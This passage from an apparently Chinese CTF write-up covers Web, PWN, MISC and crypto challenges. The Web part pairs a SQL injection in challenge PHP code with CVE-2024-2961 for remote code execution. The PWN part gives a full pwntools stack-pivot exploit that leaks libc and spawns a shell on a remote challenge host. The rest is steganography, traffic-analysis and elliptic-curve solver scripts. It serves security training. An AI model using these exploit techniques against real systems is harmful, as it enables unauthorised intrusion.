class="hljs-title function_ invoke__">mysqli_stmt_execute</span>(<span class="hljs-variable">$stmt</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$tmpInfo</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmpInfo</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filename</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-variable">$var_size</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>( <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$x</span>++ ) &#123;<br>        <span class="hljs-variable">$random_str</span>= <span class="hljs-variable">$chars</span>[ <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-variable">$var_size</span> - <span class="hljs-number">1</span> ) ];<br>        <span class="hljs-variable">$res</span> .= <span class="hljs-variable">$random_str</span>;<br>    &#125;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>). <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$res</span> . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$conn</span> , <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT filename from data where url = &#x27;<span class="hljs-subst">$url</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">foreach</span> ( <span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 <code>check</code> 里面存在 SQL 注入，我们可以尝试通过 <code>UNION SELECT</code> 来注入任意文件名丢给 <code>hash_file</code></p><p>由于无回显，考虑利用 <code>CVE-2024-2961</code> (CN-EXT) 来进行 RCE</p><p>我们可以利用之前的文件读取拿到<code>/proc/self/maps</code> 内存映射和 <code>/lib/x86_64-linux-gnu/libc-2.31.so</code> </p><p>可以稍微改改 <a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a> 然后拿到 <code>php://filter/</code> 链子，为了保证格式正确，我们可以添一个 <code>unhex()</code></p><p><img src="https://s2.loli.net/2024/08/28/lP84FJgabRS7VNL.png" alt="image-20240828030147940"></p><p><img src="https://s2.loli.net/2024/08/28/2gN6E8xeAO3PmIo.png" alt="image-20240828030212956"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>三次栈迁移，第一次控制read的buf，第二次泄露真实地址，第三次getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">31075</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pstack&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>bss = <span class="hljs-number">0x601010</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>rdi = <span class="hljs-number">0x400773</span><br>rbp = <span class="hljs-number">0x4005b0</span><br>lea = <span class="hljs-number">0x4006C4</span><br>leave = <span class="hljs-number">0x4006DB</span><br>payload1 = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span> + p64(bss + <span class="hljs-number">0x530</span>) + p64(lea)<br>io.recvuntil(<span class="hljs-string">&#x27;overflow?&#x27;</span>)<br>io.send(payload1)<br>payload2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(rbp) + p64(bss + <span class="hljs-number">0x900</span>) + p64(lea) + p64(bss + <span class="hljs-number">0x500</span> - <span class="hljs-number">0x08</span>) + p64(leave)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload2)<br>puts_real_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload3 = p64(rdi) + p64(binsh) + p64(system)<br>payload3 = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(bss + <span class="hljs-number">0x900</span> -<span class="hljs-number">0x38</span>) + p64(leave) <br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/27/QC8wkApaPlBvhVy.png" alt="image-20240827151122205"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h3><p><img src="https://s2.loli.net/2024/08/27/7UxmHqtahskwMz2.png" alt="image-20240827151403143"></p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hidden_text</span>(<span class="hljs-params">wav_file, output_file</span>):<br><br>    <span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(wav_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br>    txt_length = <span class="hljs-built_in">int</span>.from_bytes(wav_data[:<span class="hljs-number">3</span> * <span class="hljs-number">4</span>:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>    txt_data = <span class="hljs-built_in">bytes</span>(wav_data[<span class="hljs-number">3</span> * <span class="hljs-number">4</span>::<span class="hljs-number">4</span>][:txt_length])<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(txt_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag successfully extracted to <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    extract_hidden_text(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;extracted_flag.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/27/k2mEGOrRIU1P5if.png" alt="image-20240827181838761"></p><h3 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h3><p>将题目给的数字进行拆分，分成两部分</p><p>即</p><p>若女可为11，可为1124……觜可为91，亦可为725……如此往复，周而复始。</p><p>分成1、1 和11、24 ，9、1和7、25</p><p>再根据hint的图片，前面部分对应子丑寅卯，后面对应28星宿，对子丑寅卯进行编号</p><p>子，丑，寅，卯，辰，巳，午，未</p><p>1     2     3     4    5     6           7        8</p><p>一直到12 顺时针进行编号，对外围的星宿进行逆时针编号，</p><p>此时，11对应的是子的第一个，即是女</p><p>根据这种解码方式</p><p>可以得到：</p><p>心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</p><p>对这个进行替换后莫斯解码：</p><p>. .–.-. … .. .—- -.– -.-.–</p><p>得到压缩包的key</p><p>E@SI1Y!</p><p>解密压缩包后得到两个文件</p><p>hint.png 中有一个天琴座，英文翻译为：</p><p>Lyra</p><p>根据iscc2024题目可以解密</p><p>在github上找个codespace，配一配</p><p><img src="https://s2.loli.net/2024/08/28/XaqIGrHYbUE1VSL.png" alt="image-20240828054756631"></p><p>听出来是核心价值观编码，解密即可得到flag</p><p><img src="https://s2.loli.net/2024/08/28/Tve5a7rsAfbxEVd.png" alt="image-20240828054819484"></p><h3 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h3><p>打开压缩包发现压缩包注释，base58解码后得到：Welcome2GZ</p><p><img src="https://s2.loli.net/2024/08/28/IlmvF6Q9ABeVifw.png" alt="image-20240828040156498"></p><p>打开txt发现是二进制文件</p><p><img src="https://s2.loli.net/2024/08/28/BPXHOQRYIepgumU.png" alt="image-20240828040232456"></p><p>另存后打开发现wireshark字段，文件后缀改成pcap</p><p><img src="C:\Users\67388\AppData\Roaming\Typora\typora-user-images\image-20240828040336304.png" alt="image-20240828040336304"></p><p>打开发现大量tls1.3的流量，需要key.log文件来解密，但是流量包中无任何文件可用来解密</p><p><img src="https://s2.loli.net/2024/08/28/hLcmnZIsMq8lGw5.png" alt="image-20240828040358072"></p><p>打开txt文件，发现存在大量00和20交替出现作为两个字符之间的分隔符</p><p><img src="https://s2.loli.net/2024/08/28/UlpkBrTuqNYfvoj.png" alt="image-20240828040409033"></p><p>确定存在隐写，使用wbStego解密，密码是我们之前的压缩包注释base58解密后的东西。<br>然后可以得到key.log，解密tls流量</p><p><img src="https://s2.loli.net/2024/08/28/cfZkxX3Sv5TPswC.png" alt="image-20240828040428463"></p><p>导出压缩包中的各个对象</p><p><img src="https://s2.loli.net/2024/08/28/uNybKtTgOQLl4Zz.png" alt="image-20240828040441901"></p><p>发现有个flag.gif，分帧未发现任何数据<br>提取每帧的帧长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_frame_durations</span>(<span class="hljs-params">gif_path</span>):<br>    <span class="hljs-keyword">with</span> Image.<span class="hljs-built_in">open</span>(gif_path) <span class="hljs-keyword">as</span> gif:<br>        frame_durations = []<br>        <span class="hljs-keyword">for</span> frame <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(gif.n_frames):<br>            gif.seek(frame)<br>            <span class="hljs-comment"># 获取每一帧的显示时间</span><br>            duration = gif.info.get(<span class="hljs-string">&#x27;duration&#x27;</span>, <span class="hljs-number">0</span>)<br>            frame_durations.append(duration)<br>        <span class="hljs-keyword">return</span> frame_durations<br><br><span class="hljs-comment"># 示例用法</span><br>gif_path = <span class="hljs-string">&#x27;flag.gif&#x27;</span>  <br>durations = extract_frame_durations(gif_path)<br><span class="hljs-keyword">for</span> i, duration <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(durations):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Frame <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;duration&#125;</span> ms&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/28/eLwFoHjb2u4mCJZ.png" alt="image-20240828040550305"></p><p>发现只有两个数据一直重复，考虑是二进制，提取出来后得到flag</p><p><img src="https://s2.loli.net/2024/08/28/xgarmW4jG3Ab61O.png" alt="image-20240828040606904"></p><h3 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h3><p>流量包中发现发现 Shiro 流量特征</p><p>解密 <img src="https://s2.loli.net/2024/08/28/EfbzouGXqaI9RVy.png" alt="image-20240828030617704"></p><p>得到前一半 Flag</p><p>之后读取了 <code>secret.txt</code> ，导出后发现</p><p><img src="https://s2.loli.net/2024/08/28/nKBYTPVDlZg9HIJ.png" alt="image-20240828032306679"></p><p>发现文件最后有504b03，发现是zip头，写个脚本逆序<br><img src="https://s2.loli.net/2024/08/28/fQieZlJLjaBboNr.png" alt="image-20240828032353836"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_bytes_in_file</span>(<span class="hljs-params">input_file_path, output_file_path</span>):<br>    <span class="hljs-comment"># 打开输入文件并读取数据</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        data = file.read()<br><br>    <span class="hljs-comment"># 逆序每个字节</span><br>    reversed_data = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 将每个字节的十六进制表示形式进行逆序处理</span><br>        hex_str = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;byte:02X&#125;</span>&quot;</span><br>        reversed_hex_str = hex_str[::-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 逆序字符串</span><br>        reversed_byte = <span class="hljs-built_in">int</span>(reversed_hex_str, <span class="hljs-number">16</span>)  <span class="hljs-comment"># 将逆序后的字符串转换回整数</span><br>        reversed_data.append(reversed_byte)<br><br>    <span class="hljs-comment"># 写入处理后的数据到输出文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(reversed_data)<br><br><br><br>input_file = <span class="hljs-string">&#x27;output.zip&#x27;</span>  <span class="hljs-comment"># 输入文件路径</span><br>output_file = <span class="hljs-string">&#x27;output_file.zip&#x27;</span>  <span class="hljs-comment"># 输出文件路径</span><br>reverse_bytes_in_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/28/QadPNzT6FDfCG8n.png" alt="image-20240828032452927"></p><p>有密码，之前流量包中分析：</p><p><img src="https://s2.loli.net/2024/08/28/tC7DxTZyXbmIHnp.png" alt="image-20240828032511990"></p><p>得到密码，解压得到图片，更改图片宽高：</p><p><img src="https://s2.loli.net/2024/08/28/GbASY6JdOMv7Cxk.png" alt="image-20240828032538587"></p><p>得到</p><p><img src="https://s2.loli.net/2024/08/28/IlbXWdymtwExAR8.png" alt="image-20240828032551059"></p><p><a href="https://www.behance.net/gallery/76299757/CAT-font-alphabet">https://www.behance.net/gallery/76299757/CAT-font-alphabet</a></p><p>根据作者码表解码得到flag</p><h3 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h3><p>爆破压缩包</p><p><img src="https://s2.loli.net/2024/08/27/U8YLg961u7hOlxN.png" alt="image-20240827161826342"></p><p>打开得到残缺QRcode</p><p><img src="https://s2.loli.net/2024/08/27/GAxSl3Q4aK6Yoc7.png" alt="image-20240827161915099"></p><p>补全定位块</p><p><img src="https://s2.loli.net/2024/08/27/e6o53wDdjI1mZ9V.png" alt="image-20240827161942541"></p><p>得到NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p><p>根据题目提示，rot13解密得到数据库密码AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p><p><img src="C:\Users\67388\Downloads/IMG_2298.JPG" alt="IMG_2298"></p><p>根据提示为AES解密</p><p>首先在数据库中拿到数据</p><p><img src="C:\Users\67388\Downloads/IMG_2299.JPG" alt="IMG_2299"></p><p>最后AES解密得到flag</p><p><img src="https://s2.loli.net/2024/08/27/6zciQvhxZXeENkG.png" alt="image-20240827163109440"></p><h3 id="so-much"><a href="#so-much" class="headerlink" title="so much"></a>so much</h3><p>文件名base64解密</p><p><img src="https://s2.loli.net/2024/08/28/Fcfq4lrn1mMaoi7.png" alt="image-20240828034352356"></p><p>文件末尾有个key</p><p><img src="https://s2.loli.net/2024/08/28/GRLpxM3ygTPIKzW.png" alt="image-20240828034441238"></p><p>使用ftk挂载镜像</p><p><img src="https://s2.loli.net/2024/08/28/QiNmteg91P2UbLf.png" alt="image-20240828034536009"></p><p>需要密码密码是!@#$%^&amp; 即1234567按住shift输入即可</p><p><img src="https://s2.loli.net/2024/08/28/tYVbiMHnfwuFsl1.png" alt="image-20240828034659478"></p><p>只读模式挂载，发现大量crypto后缀文件：</p><p><img src="https://s2.loli.net/2024/08/28/CDG4IABNS6qOrLW.png" alt="image-20240828034750386"></p><p>使用python处理文件，发现文件修改时间只有19和20，考虑二进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 目录路径</span><br>directory_path = <span class="hljs-string">&quot;./disk/&quot;</span>  <span class="hljs-comment"># 替换为实际目录路径</span><br><br><span class="hljs-comment"># 正则表达式用于提取文件名中的数字部分</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;(\d+)&quot;</span>, filename)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)<br><br><span class="hljs-comment"># 获取文件名列表并按数字顺序排序</span><br>file_list = <span class="hljs-built_in">sorted</span>(os.listdir(directory_path), key=extract_number)<br><br><span class="hljs-comment"># 遍历排序后的文件</span><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> file_list:<br>    file_path = os.path.join(directory_path, filename)<br>    <br>    <span class="hljs-comment"># 获取文件的修改时间</span><br>    modification_time = os.path.getmtime(file_path)<br>    modification_datetime = datetime.fromtimestamp(modification_time)<br>    <br>    <span class="hljs-comment"># 获取修改时间的分钟部分</span><br>    minute = modification_datetime.minute<br>    <br><br>    <br>    <span class="hljs-keyword">if</span> output <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;filename&#125;</span>,<span class="hljs-subst">&#123;minute&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>转0和1后cyberchef解密</p><p><img src="https://s2.loli.net/2024/08/28/chTKel3GUoLiAZg.png" alt="image-20240828035256577"></p><p>用encrytpo解密前两个文件得到flag</p><p><img src="https://s2.loli.net/2024/08/28/2f3WgmChHO4L1B7.png" alt="image-20240828040004947"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="TH-Curve"><a href="#TH-Curve" class="headerlink" title="TH_Curve"></a>TH_Curve</h3><p>就是将这个非标准的th曲线上的点转化到基本的标准曲线上 然后求dlp</p><p>恢复m在crt（中国剩余定理）多次合并计算结果即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs sage">from sage.all import *<br>from Crypto.Util.number import long_to_bytes<br><br>def get_params():<br>    p = 10297529403524403127640670200603184608844065065952536889<br>    a = 2<br>    G = (8879931045098533901543131944615620692971716807984752065, <br>         4106024239449946134453673742202491320614591684229547464)<br>    d = 8817708809404273675545317762394593437543647288341187200<br>    b = 2023311503805954111362735874303860040942654548593039668<br>    return p, a, G, d, b<br><br>def calc_x1_y1(G, b, p):<br>    G_x, G_y = G<br>    x1 = G_x * b % p<br>    y1 = G_y<br>    return x1, y1<br><br>def check_d1(x1, y1, p, d1):<br>    assert (x1**3 + y1**3 + 1) % p == d1 * x1 * y1 % p, &quot;d1 校验失败&quot;<br><br>def calc_d2_uv(x1, y1, d1, p):<br>    d2 = (inverse_mod(3, p) * d1) % p<br>    u = (12 * (d2**3 - 1) * inverse_mod(d2 + x1 + y1, p) - 9 * d2**2) % p<br>    v = (36 * (y1 - x1) * (d2**3 - 1) * inverse_mod(d2 + x1 + y1, p)) % p<br>    return d2, u, v<br><br>def define_curve(d2, p):<br>    a4 = -27 * d2 * (d2**3 + 8)<br>    a6 = 54 * (d2**6 - 20 * d2**3 - 8)<br>    E = EllipticCurve(GF(p), [a4, a6])<br>    return E<br><br>def calc_Q(x2, y2, d2, p):<br>    u2 = (12 * (d2**3 - 1) * inverse_mod(d2 + x2 + y2, p) - 9 * d2**2) % p<br>    v2 = (36 * (y2 - x2) * (d2**3 - 1) * inverse_mod(d2 + x2 + y2, p)) % p<br>    return u2, v2<br><br>def factor_order(E):<br>    factors, exponents = zip(*factor(E.order()))<br>    primes = [factors[i]**exponents[i] for i in range(len(factors))][4:-1]<br>    return primes<br><br>def calc_logs(P, Q, primes):<br>    logs = []<br>    for p in primes:<br>        t = P.order() // p<br>        log = discrete_log(t * Q, t * P, operation=&quot;+&quot;)<br>        logs.append(log)<br>    return 